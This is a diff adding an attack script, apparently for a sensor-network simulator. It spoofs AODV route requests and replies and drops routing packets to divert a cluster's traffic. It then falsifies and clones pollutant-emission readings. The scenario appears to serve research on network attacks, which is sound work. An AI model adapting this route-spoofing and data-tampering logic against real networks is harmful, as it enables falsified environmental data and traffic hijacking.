@@ -1,0 +1,193 @@
+# file: attack3-clone4-v17.adl
+#
+# technique: attack against routing by using injections.
+#
+# brief: The objective is to tamper data regarding pollutant emissions 
+#        of cluster-2.
+#
+# detail: Node 6's reports (i.e. cluster-2's data) are first tampered 
+#         and then sent to the sink along a not convenient route passing
+#         through node 17. 
+#         To modify the route, node 17 sends a RREP message having
+#         a convenient 'hop-count' to node 6.
+
+
+list node_4 = {4}
+list node_6 = {6}
+list node_15 = {15}
+list node_17 = {17}
+list node_18 = {18}
+
+
+# break the path 17 <-> 18 in pre-existing routes
+# node 17 drops RREQ from node 18
+from 175 nodes in node_17 do{
+
+    filter("NET.source" == 18 and "NET.id" == 1)
+        drop(original, 1)
+
+}
+
+
+# break the path path 4 <-> 6 in pre-existing routes
+# node 4 drops RREP from node 6
+from 175 nodes in node_4 do{
+
+    filter("NET.source" == 6 and "NET.id" == 2)
+        drop(original, 1)
+
+}
+
+
+# break the path path 4 <-> 6 in pre-existing routes
+# node 4 drops RREQ from node 6
+from 175 nodes in node_4 do{
+
+    filter("NET.source" == 6 and "NET.id" == 1)
+        drop(original, 1)
+
+}
+
+
+# node 17 drops RREP from node 18
+from 175 nodes in node_17 do{
+
+    filter("NET.source" == 18 and "NET.id" == 2)
+        drop(original, 1)
+
+}
+
+
+# build the route 6 -> 17 -> 18 -> .. -> 0
+
+# send a fake RREQ to 18 that seems to come from node 17.
+from 175 every 20 do{
+
+    # declare fake RREQ
+    packet fakeRREQ
+
+    # create fake RREQ
+    create(fakeRREQ, "NET.type", 1)
+
+    # fill its fields
+    change(fakeRREQ, "NET.hopCount", 0)
+    change(fakeRREQ, "NET.source", 17)
+    change(fakeRREQ, "NET.sourceAodv", 17)
+    change(fakeRREQ, "NET.destination", 0)
+    change(fakeRREQ, "NET.destinationAodv", 0)
+    change(fakeRREQ, "NET.sourceSeqNum", 1)
+    change(fakeRREQ, "NET.rreqID", 0)
+    change(fakeRREQ, "NET.ttl", 4)
+	
+    # send the fake RREQ to node 18
+    put(fakeRREQ, node_18, RX, TRUE, 1.5)
+}
+
+
+# send a fake RREP to node 17 that seem to come from node 18; in this way, when
+# node 17 receives data from node 6, it does not send a RREQ to it which
+# can create a loop
+from 176 every 20 do{
+
+    # declare fake RREP
+    packet fakeRREP
+
+    # create the fake RREP
+    create(fakeRREP, "NET.type", 2)
+
+	# fill its fields
+    change(fakeRREP, "NET.hopCount", 1)
+    change(fakeRREP, "NET.source", 18)
+    change(fakeRREP, "NET.destination", 17)
+    change(fakeRREP, "NET.destinationAodv", 0)
+    change(fakeRREP, "NET.originator", 17)
+    change(fakeRREP, "NET.destinationSeqNum", 1)
+    change(fakeRREP, "NET.lifetime", 400)
+	
+    # send the fake RREP to node 17
+    put(fakeRREP, node_17, RX, TRUE, 1)
+}
+
+
+
+# send a fake RREP to 6 that seems to come frome node 17
+from 180 every 20 do{
+
+    # declare the fake RREP
+    packet fakeRREP
+
+    # create the fake RREP
+    create(fakeRREP, "NET.type", 2)
+
+    # fill its fields
+    change(fakeRREP, "NET.hopCount", 2)
+    change(fakeRREP, "NET.source", 17)
+    change(fakeRREP, "NET.destination", 6)
+    change(fakeRREP, "NET.destinationAodv", 0)
+    change(fakeRREP, "NET.originator", 6)
+    change(fakeRREP, "NET.destinationSeqNum", 10)
+    change(fakeRREP, "NET.lifetime", 400)
+	
+    # send the fake RREP to node 6
+    put(fakeRREP, node_6, RX, TRUE, 1.5)
+    
+}
+
+
+# tamper clones of node 15's packets
+from 180 nodes in node_15 do{
+    
+    filter( "NET.source" == 15 and "NET.id" == 6)
+
+        # declare clone packets
+        packet dolly1
+        packet dolly2
+        packet dolly3
+        packet dolly4
+        
+        # declare and initialize variables
+        var data = 0
+        var appSeqNum = 20000
+
+        # tamper original packet
+        retrieve(original, "APP.data", data)
+        data -= 17	
+        change(original, "APP.data", data)
+        change(original, "APP.sequenceNumber", appSeqNum)
+
+        # inc app sequence number for dolly1
+        appSeqNum +=1
+
+        # clone and tamper
+        clone(original, dolly1)
+        change(dolly1, "APP.sequenceNumber", appSeqNum)
+        send(dolly1, 0)
+
+        # update the seq number for dolly2
+        appSeqNum +=1
+        
+        # clone and tamper
+        clone(original, dolly2)
+        change(dolly2, "APP.sequenceNumber", appSeqNum)
+        send(dolly2, 0)
+        
+        # update the seq number for dolly3
+        appSeqNum +=1
+        
+        # clone and tamper
+        clone(original, dolly3)
+        change(dolly3, "APP.sequenceNumber", appSeqNum)
+        send(dolly3, 0)
+        
+        # update the seq number for dolly4
+        appSeqNum +=1
+        
+        # clone and tamper
+        clone(original, dolly4)
+        change(dolly4, "APP.sequenceNumber", appSeqNum)
+        send(dolly4, 0)
+
+        # update the seq number for next original packet
+        appSeqNum +=1
+    
+}
